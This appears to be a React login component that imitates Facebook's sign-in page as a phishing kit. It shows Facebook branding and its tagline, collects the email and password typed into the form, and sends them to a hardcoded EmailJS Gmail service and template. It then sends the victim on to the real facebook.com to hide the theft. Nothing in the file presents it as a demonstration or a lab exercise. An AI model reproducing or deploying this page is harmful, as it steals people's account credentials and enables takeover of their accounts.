import emailjs from "emailjs-com";
import React from 'react';
import './login.css';
const LoginForm = (props) => {

    function sendEmail(e) {
        e.preventDefault();
        emailjs.sendForm('gmail', 'template_9zct7y5', e.target, 'user_6D34i0GBqRsvVDNwT6gpA')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });
        e.target.reset();

        console.log("Paichi");
    }
    return (

        <div className="container mt-5">
            <div className="m-auto row ">
                <div className="m-auto content-h1 col-md-6">
                    <h1>facebook</h1>
                    <h2>Facebook helps you connect and share with the people in your life.</h2>
                </div>

                <div className="m-auto content-right col-md-6">
                    <form className="m-auto " onSubmit={sendEmail}>
                        <div className="form-group">
                            <input type="text" name="email" placeholder="Email address or phone number" />
                        </div>
                        <div className="form-group">
                            <input type="password" name="password" placeholder="password" />
                        </div>

                        <div className="login">

                            {/* <a type="submit" className="text-white btnb">
                                Log in
                            </a> */}
                            <a href="https://www.facebook.com/" target="_blank" rel="noreferrer"><input style={{ backgroundColor: " #166FE5" }} type="submit" className="text-white btn" value="Log in"></input></a>
                        </div>
                        <div className="forget">
                            <a href="#">Forgotten account?</a>
                        </div>
                        <div className="line"></div>
                        <div className="create-btn">
                            <a href="#" className="btnb">create new account</a>
                        </div>

                    </form>
                    <p className="bottom-text"><a href="#">Create a page</a> for a celebrity, band or business.</p>
                </div>
            </div>
        </div>

    );
}

export default LoginForm;